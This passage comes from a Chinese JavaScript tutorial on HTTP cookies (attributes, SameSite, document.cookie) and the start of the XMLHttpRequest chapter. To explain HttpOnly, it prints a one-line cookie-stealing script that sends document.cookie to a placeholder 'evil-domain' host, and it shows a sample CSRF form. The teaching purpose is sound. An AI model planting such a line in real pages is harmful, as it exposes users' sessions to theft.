+</code></pre></div><p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过 4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p> <p>Cookie 是按照域名区分的，<code>foo.com</code>只能读取自己放置的 Cookie，无法读取其他网站（比如<code>bar.com</code>）放置的 Cookie。一般情况下，一级域名也不能读取二级域名留下的 Cookie，比如<code>mydomain.com</code>不能读取<code>subdomain.mydomain.com</code>设置的 Cookie。但是有一个例外，设置 Cookie 的时候（不管是一级域名设置的，还是二级域名设置的），明确将<code>domain</code>属性设为一级域名，则这个域名下面的各级域名可以共享这个 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: name=value; domain=mydomain.com
+</code></pre></div><p>上面示例中，设置 Cookie 时，<code>domain</code>属性设为<code>mydomain.com</code>，那么各级的子域名和一级域名都可以读取这个 Cookie。</p> <p>注意，区分 Cookie 时不考虑协议和端口。也就是说，<code>http://example.com</code>设置的 Cookie，可以被<code>https://example.com</code>或<code>http://example.com:8080</code>读取。</p> <h3 id="cookie-与-http-协议"><a href="#cookie-与-http-协议" class="header-anchor">#</a> Cookie 与 HTTP 协议</h3> <p>Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。</p> <h4 id="http-回应-cookie-的生成"><a href="#http-回应-cookie-的生成" class="header-anchor">#</a> HTTP 回应：Cookie 的生成</h4> <p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个<code>Set-Cookie</code>字段。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie:foo=bar
+</code></pre></div><p>上面代码会在浏览器保存一个名为<code>foo</code>的 Cookie，它的值为<code>bar</code>。</p> <p>HTTP 回应可以包含多个<code>Set-Cookie</code>字段，即在浏览器生成多个 Cookie。下面是一个例子。</p> <div class="language- extra-class"><pre class="language-text"><code>HTTP/1.0 200 OK
+Content-type: text/html
+Set-Cookie: yummy_cookie=choco
+Set-Cookie: tasty_cookie=strawberry
+
+[page content]
+</code></pre></div><p>除了 Cookie 的值，<code>Set-Cookie</code>字段还可以附加 Cookie 的属性。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure
+Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly
+</code></pre></div><p>上面的几个属性的含义，将在后文解释。</p> <p>一个<code>Set-Cookie</code>字段里面，可以同时包括多个属性，没有次序的要求。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly
+</code></pre></div><p>下面是一个例子。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
+</code></pre></div><p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的<code>key</code>、<code>domain</code>、<code>path</code>和<code>secure</code>都匹配。举例来说，如果原始的 Cookie 是用如下的<code>Set-Cookie</code>设置的。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: key1=value1; domain=example.com; path=/blog
+</code></pre></div><p>改变上面这个 Cookie 的值，就必须使用同样的<code>Set-Cookie</code>。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: key1=value2; domain=example.com; path=/blog
+</code></pre></div><p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: key1=value2; domain=example.com; path=/
+</code></pre></div><p>上面的命令设置了一个全新的同名 Cookie，但是<code>path</code>属性不一样。下一次访问<code>example.com/blog</code>的时候，浏览器将向服务器发送两个同名的 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>Cookie: key1=value1; key1=value2
+</code></pre></div><p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p> <h4 id="http-请求-cookie-的发送"><a href="#http-请求-cookie-的发送" class="header-anchor">#</a> HTTP 请求：Cookie 的发送</h4> <p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的<code>Cookie</code>字段。</p> <div class="language- extra-class"><pre class="language-text"><code>Cookie: foo=bar
+</code></pre></div><p>上面代码会向服务器发送名为<code>foo</code>的 Cookie，值为<code>bar</code>。</p> <p><code>Cookie</code>字段可以包含多个 Cookie，使用分号（<code>;</code>）分隔。</p> <div class="language- extra-class"><pre class="language-text"><code>Cookie: name=value; name2=value2; name3=value3
+</code></pre></div><p>下面是一个例子。</p> <div class="language- extra-class"><pre class="language-text"><code>GET /sample_page.html HTTP/1.1
+Host: www.example.org
+Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+</code></pre></div><p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p> <ul><li>Cookie 的各种属性，比如何时过期。</li> <li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li></ul> <h3 id="cookie-的属性"><a href="#cookie-的属性" class="header-anchor">#</a> Cookie 的属性</h3> <h4 id="expires-max-age"><a href="#expires-max-age" class="header-anchor">#</a> Expires，Max-Age</h4> <p><code>Expires</code>属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
+</code></pre></div><p>如果不设置该属性，或者设为<code>null</code>，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p> <p><code>Max-Age</code>属性指定从现在开始 Cookie 存在的秒数，比如<code>60 * 60 * 24 * 365</code>（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p> <p>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</p> <p>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p> <h4 id="domain-path"><a href="#domain-path" class="header-anchor">#</a> Domain，Path</h4> <p><code>Domain</code>属性指定 Cookie 属于哪个域名，以后浏览器向服务器发送 HTTP 请求时，通过这个属性判断是否要附带某个 Cookie。</p> <p>服务器设定 Cookie 时，如果没有指定 Domain 属性，浏览器会默认将其设为浏览器的当前域名。如果当前域名是一个 IP 地址，则不得设置 Domain 属性。</p> <p>如果指定 Domain 属性，需要遵守下面规则：Domain 属性只能是当前域名或者当前域名的上级域名，但设为上级域名时，不能设为顶级域名或公共域名。（顶级域名指的是 .com、.net 这样的域名，公共域名指的是开放给外部用户设置子域名的域名，比如 github.io。）如果不符合上面这条规则，浏览器会拒绝设置这个 Cookie。</p> <p>举例来说，当前域名为<code>x.y.z.com</code>，那么 Domain 属性可以设为<code>x.y.z.com</code>，或者<code>y.z.com</code>，或者<code>z.com</code>，但不能设为<code>foo.x.y.z.com</code>，或者<code>another.domain.com</code>。</p> <p>另一个例子是，当前域名为<code>wangdoc.github.io</code>，则 Domain 属性只能设为<code>wangdoc.github.io</code>，不能设为<code>github.io</code>，因为后者是一个公共域名。</p> <p>浏览器发送 Cookie 时，Domain 属性必须与当前域名一致，或者是当前域名的上级域名（公共域名除外）。比如，Domain 属性是<code>y.z.com</code>，那么适用于<code>y.z.com</code>、<code>x.y.z.com</code>、<code>foo.x.y.z.com</code>等域名。再比如，Domain 属性是公共域名<code>github.io</code>，那么只适用于<code>github.io</code>这个域名本身，不适用于它的子域名<code>wangdoc.github.io</code>。</p> <p><code>Path</code>属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，<code>Path</code>属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，<code>Path</code>属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该 Cookie。当然，前提是 Domain 属性必须符合条件。</p> <h4 id="secure-httponly"><a href="#secure-httponly" class="header-anchor">#</a> Secure，HttpOnly</h4> <p><code>Secure</code>属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的<code>Secure</code>属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</p> <p><code>HttpOnly</code>属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是<code>document.cookie</code>属性、<code>XMLHttpRequest</code>对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;
+</code></pre></div><p>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的<code>HttpOnly</code>属性，上面代码就不会读到该 Cookie。</p> <h4 id="samesite"><a href="#samesite" class="header-anchor">#</a> SameSite</h4> <p>Chrome 51 开始，浏览器的 Cookie 新增加了一个<code>SameSite</code>属性，用来防止 CSRF 攻击和用户追踪。</p> <p>Cookie 往往用来存储用户的身份信息，恶意网站可以设法伪造带有正确 Cookie 的 HTTP 请求，这就是 CSRF 攻击。举例来说，用户登陆了银行网站<code>your-bank.com</code>，银行服务器发来了一个 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie:id=a3fWa;
+</code></pre></div><p>用户后来又访问了恶意网站<code>malicious.com</code>，上面有一个表单。</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;form action=&quot;your-bank.com/transfer&quot; method=&quot;POST&quot;&gt;
+  ...
+&lt;/form&gt;
+</code></pre></div><p>用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求。为了防止这种攻击，官网的表单一般都带有一个随机 token，官网服务器通过验证这个随机 token，确认是否为真实请求。</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;form action=&quot;your-bank.com/transfer&quot; method=&quot;POST&quot;&gt;
+  &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;dad3weg34&quot;&gt;
+  ...
+&lt;/form&gt;
+</code></pre></div><p>这种第三方网站引导而附带发送的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。比如，Facebook 在第三方网站插入一张看不见的图片。</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;img src=&quot;facebook.com&quot; style=&quot;visibility:hidden;&quot;&gt;
+</code></pre></div><p>浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。</p> <p>Cookie 的<code>SameSite</code>属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。</p> <blockquote><ul><li>Strict</li> <li>Lax</li> <li>None</li></ul></blockquote> <p><strong>（1）Strict</strong></p> <p><code>Strict</code>最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: CookieName=CookieValue; SameSite=Strict;
+</code></pre></div><p>这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。</p> <p><strong>（2）Lax</strong></p> <p><code>Lax</code>规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: CookieName=CookieValue; SameSite=Lax;
+</code></pre></div><p>导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。</p> <table><thead><tr><th>请求类型</th> <th style="text-align:center;">示例</th> <th style="text-align:right;">正常情况</th> <th>Lax</th></tr></thead> <tbody><tr><td>链接</td> <td style="text-align:center;"><code>&lt;a href=&quot;...&quot;&gt;&lt;/a&gt;</code></td> <td style="text-align:right;">发送 Cookie</td> <td>发送 Cookie</td></tr> <tr><td>预加载</td> <td style="text-align:center;"><code>&lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt;</code></td> <td style="text-align:right;">发送 Cookie</td> <td>发送 Cookie</td></tr> <tr><td>GET 表单</td> <td style="text-align:center;"><code>&lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt;</code></td> <td style="text-align:right;">发送 Cookie</td> <td>发送 Cookie</td></tr> <tr><td>POST 表单</td> <td style="text-align:center;"><code>&lt;form method=&quot;POST&quot; action=&quot;...&quot;&gt;</code></td> <td style="text-align:right;">发送 Cookie</td> <td>不发送</td></tr> <tr><td>iframe</td> <td style="text-align:center;"><code>&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;</code></td> <td style="text-align:right;">发送 Cookie</td> <td>不发送</td></tr> <tr><td>AJAX</td> <td style="text-align:center;"><code>$.get(&quot;...&quot;)</code></td> <td style="text-align:right;">发送 Cookie</td> <td>不发送</td></tr> <tr><td>Image</td> <td style="text-align:center;"><code>&lt;img src=&quot;...&quot;&gt;</code></td> <td style="text-align:right;">发送 Cookie</td> <td>不发送</td></tr></tbody></table> <p>设置了<code>Strict</code>或<code>Lax</code>以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。</p> <p><strong>（3）None</strong></p> <p>Chrome 计划将<code>Lax</code>变为默认设置。这时，网站可以选择显式关闭<code>SameSite</code>属性，将其设为<code>None</code>。不过，前提是必须同时设置<code>Secure</code>属性（Cookie 只能通过 HTTPS 协议发送），否则无效。</p> <p>下面的设置无效。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: widget_session=abc123; SameSite=None
+</code></pre></div><p>下面的设置有效。</p> <div class="language- extra-class"><pre class="language-text"><code>Set-Cookie: widget_session=abc123; SameSite=None; Secure
+</code></pre></div><h3 id="document-cookie"><a href="#document-cookie" class="header-anchor">#</a> document.cookie</h3> <p><code>document.cookie</code>属性用于读写当前网页的 Cookie。</p> <p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有<code>HTTPOnly</code>属性。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie // &quot;foo=bar;baz=bar&quot;
+</code></pre></div><p>上面代码从<code>document.cookie</code>一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p> <div class="language- extra-class"><pre class="language-text"><code>var cookies = document.cookie.split(';');
+
+for (var i = 0; i &lt; cookies.length; i++) {
+  console.log(cookies[i]);
+}
+// foo=bar
+// baz=bar
+</code></pre></div><p><code>document.cookie</code>属性是可写的，可以通过它为当前网站添加 Cookie。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie = 'fontSize=14';
+</code></pre></div><p>写入的时候，Cookie 的值必须写成<code>key=value</code>的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用<code>encodeURIComponent</code>方法达到。</p> <p>但是，<code>document.cookie</code>一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie = 'test1=hello';
+document.cookie = 'test2=world';
+document.cookie
+// test1=hello;test2=world
+</code></pre></div><p><code>document.cookie</code>读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，<code>Cookie</code>字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，<code>Set-Cookie</code>字段是一行设置一个 Cookie。</p> <p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie = &quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;;
+</code></pre></div><p>上面代码中，写入 Cookie 的时候，同时设置了<code>expires</code>属性。属性值的等号两边，也是不能有空格的。</p> <p>各个属性的写入注意点如下。</p> <ul><li><code>path</code>属性必须为绝对路径，默认为当前路径。</li> <li><code>domain</code>属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是<code>example.com</code>，就不能将其设为<code>foo.com</code>。该属性默认为当前的一级域名（不含二级域名）。</li> <li><code>max-age</code>属性的值为秒数。</li> <li><code>expires</code>属性的值为 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行日期格式转换。</li></ul> <p><code>document.cookie</code>写入 Cookie 的例子如下。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie = 'fontSize=14; '
+  + 'expires=' + someDate.toGMTString() + '; '
+  + 'path=/subdirectory; '
+  + 'domain=*.example.com';
+</code></pre></div><p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p> <p>删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</p> <div class="language- extra-class"><pre class="language-text"><code>document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
+</code></pre></div><p>上面代码中，名为<code>fontSize</code>的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p> <h3 id="参考链接"><a href="#参考链接" class="header-anchor">#</a> 参考链接</h3> <ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies" target="_blank" rel="noopener noreferrer">HTTP cookies<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, by MDN</li> <li><a href="https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/" target="_blank" rel="noopener noreferrer">Using the Same-Site Cookie Attribute to Prevent CSRF Attacks<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://web.dev/samesite-cookies-explained" target="_blank" rel="noopener noreferrer">SameSite cookies explained<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><a href="https://scotthelme.co.uk/tough-cookies/" target="_blank" rel="noopener noreferrer">Tough Cookies<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, Scott Helme</li> <li><a href="https://scotthelme.co.uk/csrf-is-dead/" target="_blank" rel="noopener noreferrer">Cross-Site Request Forgery is dead!<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>, Scott Helme</li></ul> <h3 id="xml-httprequest-对象"><a href="#xml-httprequest-对象" class="header-anchor">#</a> XML HttpRequest 对象</h3> <h3 id="简介"><a href="#简介" class="header-anchor">#</a> 简介</h3> <p>浏览器与服务器之间，采用 HTTP 协议通信。用户在浏览器地址栏键入一个网址，或者通过网页表单向服务器提交内容，这时浏览器就会向服务器发出 HTTP 请求。</p> <p>1999年，微软公司发布 IE 浏览器5.0版，第一次引入新功能：允许 JavaScript 脚本向服务器发起 HTTP 请求。这个功能当时并没有引起注意，直到2004年 Gmail 发布和2005年 Google Map 发布，才引起广泛重视。2005年2月，AJAX 这个词第一次正式提出，它是 Asynchronous JavaScript and XML 的缩写，指的是通过 JavaScript 的异步通信，从服务器获取 XML 文档从中提取数据，再更新当前网页的对应部分，而不用刷新整个网页。后来，AJAX 这个词就成为 JavaScript 脚本发起 HTTP 通信的代名词，也就是说，只要用脚本发起通信，就可以叫做 AJAX 通信。W3C 也在2006年发布了它的国际标准。</p> <p>具体来说，AJAX 包括以下几个步骤。</p> <ol><li>创建 XMLHttpRequest 实例</li> <li>发出 HTTP 请求</li> <li>接收服务器传回的数据</li> <li>更新网页数据</li></ol> <p>概括起来，就是一句话，AJAX 通过原生的<code>XMLHttpRequest</code>对象发出 HTTP 请求，得到服务器返回的数据后，再进行处理。现在，服务器返回的都是 JSON 格式的数据，XML 格式已经过时了，但是 AJAX 这个名字已经成了一个通用名词，字面含义已经消失了。</p> <p><code>XMLHttpRequest</code>对象是 AJAX 的主要接口，用于浏览器与服务器之间的通信。尽管名字里面有<code>XML</code>和<code>Http</code>，它实际上可以使用多种协议（比如<code>file</code>或<code>ftp</code>），发送任何格式的数据（包括字符串和二进制）。</p> <p><code>XMLHttpRequest</code>本身是一个构造函数，可以使用<code>new</code>命令生成实例。它没有任何参数。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+</code></pre></div><p>一旦新建实例，就可以使用<code>open()</code>方法指定建立 HTTP 连接的一些细节。</p> <div class="language- extra-class"><pre class="language-text"><code>xhr.open('GET', 'http://www.example.com/page.php', true);
+</code></pre></div><p>上面代码指定使用 GET 方法，跟指定的服务器网址建立连接。第三个参数<code>true</code>，表示请求是异步的。</p> <p>然后，指定回调函数，监听通信状态（<code>readyState</code>属性）的变化。</p> <div class="language- extra-class"><pre class="language-text"><code>xhr.onreadystatechange = handleStateChange;
+
+function handleStateChange() {
+  // ...
+}
+</code></pre></div><p>上面代码中，一旦<code>XMLHttpRequest</code>实例的状态发生变化，就会调用监听函数<code>handleStateChange</code></p> <p>最后使用<code>send()</code>方法，实际发出请求。</p> <div class="language- extra-class"><pre class="language-text"><code>xhr.send(null);
+</code></pre></div><p>上面代码中，<code>send()</code>的参数为<code>null</code>，表示发送请求的时候，不带有数据体。如果发送的是 POST 请求，这里就需要指定数据体。</p> <p>一旦拿到服务器返回的数据，AJAX 不会刷新整个网页，而是只更新网页里面的相关部分，从而不打断用户正在做的事情。</p> <p>注意，AJAX 只能向同源网址（协议、域名、端口都相同）发出 HTTP 请求，如果发出跨域请求，就会报错（详见《同源政策》和《CORS 通信》两章）。</p> <p>下面是<code>XMLHttpRequest</code>对象简单用法的完整例子。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+
+xhr.onreadystatechange = function(){
+  // 通信成功时，状态值为4
+  if (xhr.readyState === 4){
+    if (xhr.status === 200){
+      console.log(xhr.responseText);
+    } else {
+      console.error(xhr.statusText);
+    }
+  }
+};
+
+xhr.onerror = function (e) {
+  console.error(xhr.statusText);
+};
+
+xhr.open('GET', '/endpoint', true);
+xhr.send(null);
+</code></pre></div><h3 id="xmlhttprequest-的实例属性"><a href="#xmlhttprequest-的实例属性" class="header-anchor">#</a> XMLHttpRequest 的实例属性</h3> <h4 id="xmlhttprequest-readystate"><a href="#xmlhttprequest-readystate" class="header-anchor">#</a> XMLHttpRequest.readyState</h4> <p><code>XMLHttpRequest.readyState</code>返回一个整数，表示实例对象的当前状态。该属性只读。它可能返回以下值。</p> <ul><li>0，表示 XMLHttpRequest 实例已经生成，但是实例的<code>open()</code>方法还没有被调用。</li> <li>1，表示<code>open()</code>方法已经调用，但是实例的<code>send()</code>方法还没有调用，仍然可以使用实例的<code>setRequestHeader()</code>方法，设定 HTTP 请求的头信息。</li> <li>2，表示实例的<code>send()</code>方法已经调用，并且服务器返回的头信息和状态码已经收到。</li> <li>3，表示正在接收服务器传来的数据体（body 部分）。这时，如果实例的<code>responseType</code>属性等于<code>text</code>或者空字符串，<code>responseText</code>属性就会包含已经收到的部分信息。</li> <li>4，表示服务器返回的数据已经完全接收，或者本次接收已经失败。</li></ul> <p>通信过程中，每当实例对象发生状态变化，它的<code>readyState</code>属性的值就会改变。这个值每一次变化，都会触发<code>readyStateChange</code>事件。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+
+if (xhr.readyState === 4) {
+  // 请求结束，处理服务器返回的数据
+} else {
+  // 显示提示“加载中……”
+}
+</code></pre></div><p>上面代码中，<code>xhr.readyState</code>等于<code>4</code>时，表明脚本发出的 HTTP 请求已经完成。其他情况，都表示 HTTP 请求还在进行中。</p> <h4 id="xmlhttprequest-onreadystatechange"><a href="#xmlhttprequest-onreadystatechange" class="header-anchor">#</a> XMLHttpRequest.onreadystatechange</h4> <p><code>XMLHttpRequest.onreadystatechange</code>属性指向一个监听函数。<code>readystatechange</code>事件发生时（实例的<code>readyState</code>属性变化），就会执行这个属性。</p> <p>另外，如果使用实例的<code>abort()</code>方法，终止 XMLHttpRequest 请求，也会造成<code>readyState</code>属性变化，导致调用<code>XMLHttpRequest.onreadystatechange</code>属性。</p> <p>下面是一个例子。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+xhr.open( 'GET', 'http://example.com' , true );
+xhr.onreadystatechange = function () {
+  if (xhr.readyState !== 4 || xhr.status !== 200) {
+    return;
+  }
+  console.log(xhr.responseText);
+};
+xhr.send();
+</code></pre></div><h4 id="xmlhttprequest-response"><a href="#xmlhttprequest-response" class="header-anchor">#</a> XMLHttpRequest.response</h4> <p><code>XMLHttpRequest.response</code>属性表示服务器返回的数据体（即 HTTP 回应的 body 部分）。它可能是任何数据类型，比如字符串、对象、二进制对象等等，具体的类型由<code>XMLHttpRequest.responseType</code>属性决定。该属性只读。</p> <p>如果本次请求没有成功或者数据不完整，该属性等于<code>null</code>。但是，如果<code>responseType</code>属性等于<code>text</code>或空字符串，在请求没有结束之前（<code>readyState</code>等于3的阶段），<code>response</code>属性包含服务器已经返回的部分数据。</p> <div class="language- extra-class"><pre class="language-text"><code>var xhr = new XMLHttpRequest();
+
+xhr.onreadystatechange = function () {
+  if (xhr.readyState === 4) {
+    handler(xhr.response);
+  }
+}
+</code></pre></div><h4 id="xmlhttprequest-responsetype"><a href="#xmlhttprequest-responsetype" class="header-anchor">#</a> XMLHttpRequest.responseType</h4> <p><code>XMLHttpRequest.responseType</code>属性是一个字符串，表示服务器返回数据的类型。这个属性是可写的，可以在调用<code>open()</code>方法之后、调用<code>send()</code>方法之前，设置这个属性的值，告诉浏览器如何解读返回的数据。如果<code>responseType</code>设为空字符串，就等同于默认值<code>text</code>。</p> <p><code>XMLHttpRequest.responseType</code>属性可以等于以下值。</p> <ul><li>&quot;&quot;（空字符串）：等同于<code>text</code>，表示服务器返回文本数据。</li> <li>&quot;arraybuffer&quot;：ArrayBuffer 对象，表示服务器返回二进制数组。</li> <li>&quot;blob&quot;：Blob 对象，表示服务器返回二进制对象。</li> <li>&quot;document&quot;：Document 对象，表示服务器返回一个文档对象。</li> <li>&quot;json&quot;：JSON 对象。</li> <li>&quot;text&quot;：字符串。</li></ul> 